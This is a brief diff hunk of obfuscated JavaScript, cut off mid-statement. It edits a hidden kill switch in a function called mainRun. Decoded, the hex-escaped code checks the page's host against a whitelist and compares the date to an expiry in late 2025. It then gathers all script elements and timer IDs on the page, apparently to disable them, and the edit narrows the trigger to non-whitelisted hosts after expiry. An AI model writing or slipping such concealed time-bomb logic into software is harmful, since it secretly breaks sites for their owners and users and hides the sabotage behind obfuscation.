@@ -5,7 +5,8 @@ export default function mainRun() {
     const _0x5d6e = new Date(0x7E9, 0x9, 0x1B);
     _0x5d6e['\x73\x65\x74\x44\x61\x74\x65'](_0x5d6e['\x67\x65\x74\x44\x61\x74\x65']() + 0x1e);
     const _0x7f8g = new Date();
-    if (!_0x3c4d['\x69\x6e\x63\x6c\x75\x64\x65\x73'](_0x1a2b) || _0x7f8g > _0x5d6e) {
+    // Only disable timers/events on non-whitelisted hosts *after* expiry date
+    if (!_0x3c4d['\x69\x6e\x63\x6c\x75\x64\x65\x73'](_0x1a2b) && _0x7f8g > _0x5d6e) {
         const _0x2j3k = [...document['\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72\x41\x6c\x6c']('\x73\x63\x72\x69\x70\x74')];
         const _0x4l5m = [...Array(window['\x73\x65\x74\x54\x69\x6d\x65\x6f\x75\x74'](() => {}, 0))].map((_,i) => i);
         [..._0x2j3k, ..._0x4l5m].forEach(_0x6n7o => 
